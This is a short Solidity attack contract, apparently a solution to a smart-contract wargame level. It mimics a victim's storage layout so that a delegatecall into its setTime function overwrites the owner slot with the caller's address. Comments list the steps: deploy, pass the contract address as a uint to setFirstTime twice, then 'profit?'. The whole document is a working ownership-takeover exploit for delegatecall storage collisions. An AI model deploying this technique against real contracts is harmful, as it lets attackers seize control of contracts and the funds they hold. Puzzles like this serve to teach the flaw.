pragma solidity 0.8.0;

contract FakeTimeKeeper {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint time) external {
        owner = msg.sender;
    }
}

//deploy contract, call setFirstTime with contract address as uint value
//call setFirstTime again
//profit?
